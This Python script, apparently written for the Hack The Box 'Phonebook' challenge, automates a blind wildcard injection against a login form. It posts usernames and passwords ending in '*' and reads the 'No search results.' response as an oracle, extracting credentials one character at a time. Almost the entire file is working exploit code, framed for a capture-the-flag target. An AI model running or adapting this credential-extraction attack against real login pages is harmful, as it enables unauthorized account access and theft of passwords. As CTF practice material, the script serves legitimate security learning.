import requests, argparse, signal
from bs4 import BeautifulSoup
from pwn import *

BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'

def ctrl_c(sig, frame):
    print(RED + "\n[!] Saliendo...")
    exit(1)
    
signal.signal(signal.SIGINT, ctrl_c)

parse = argparse.ArgumentParser()
parse.add_argument('-u', '--url', help="Url del challenge HTB")
parse = parse.parse_args()

banner = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡌⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡌⢢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⡀⢣⠀⠀⠀⢀⣀⣀⣀⠀⠀⠀⠀⠀⢀⠃⢘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢃⠐⠀⠑⢔⠊⠁⠀⠀⠀⢩⠑⠢⣀⢀⠮⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡈⢒⡄⠀⢀⢻⠀⠀⠀⡠⠃⢆⠐⣻⠁⠀⡀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣷⡺⢽⠕⡪⡃⣀⠤⠊⠀⠀⡌⠢⠫⣢⡤⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡜⡤⡆⠣⠱⡭⠭⠴⠦⡬⠔⡓⣬⠵⠤⡽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣄⡧⢠⠘⠢⠥⠶⣚⠼⠀⡷⢭⡮⣻⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢉⢁⠀⡓⠤⠀⢠⢒⡀⠐⠰⢁⢀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⢹⣮⡄⠀⠀⠁⠤⡤⠋⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠀⠀⢽⡏⣹⣧⣤⣴⣬⢺⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⡀⠀⢿⢿⡿⠻⠿⢟⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⡀⠀⠈⠁⢉⠉⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠐⠤⣤⠜⠤⠔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 __        __        ___  __   __   __       
|__) |__| /  \ |\ | |__  |__) /  \ /  \ |__/ 
|    |  | \__/ | \| |___ |__) \__/ \__/ |  \  
     ___  __                                
|__|  |  |__)                                
|  |  |  |__)                                
BY: Alcatraz2033                                             ⠀
"""

url = parse.url
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789#$%&()|{}[]-_~"
password = ''
user = ""
bucle = True
bucle2 = True

if parse.url:
    print(GREEN + banner)
    print(CYAN + "[+]" + RESET + " SQL INYECCION...")
    p2 = log.progress("Probando con el caracter")
    p3 = log.progress("Usuario")
    p4 = log.progress("Contraseña")

    while bucle:

        for i in characters:
        
            session = requests.session()
            data = {
                'username' : f"{user + i}*",
                'password' : "*"
            }
            
            session = session.post(url, data=data)
            p2.status(f"{i}")
            if ('No search results.' in session.text):
                user += i
                p3.status(f"{user}")

            session2 = requests.session()
            data2 = {
                'username' : user,
                'password' : '*'
            }
            session2 = session2.post(url, data=data2)
            if ('No search results.' in session2.text):
                bucle = False
        if bucle == False:
            break     


    while bucle2:

        for i in characters:
        
            session = requests.session()
            data = {
                'username' : user,
                'password' : f"{password + i}*"
            }
            
            session = session.post(url, data=data)
            p2.status(f"{i}")
            if ('No search results.' in session.text):
                password += i
                p4.status(f"{password}")

            session2 = requests.session()
            data2 = {
                'username' : user,
                'password' : password
            }
            session2 = session2.post(url, data=data2)
            if ('No search results.' in session2.text):
                bucle2 = False
        if bucle2 == False:
            break     
else:
    print(GREEN + banner)
    print(RED + "[!]" + RESET + " No ha ingresado la url")
    print(CYAN + "[+]" + RESET + " Ejemplo: python3 phonebookHTB.py -u http://template.htb:9999/")
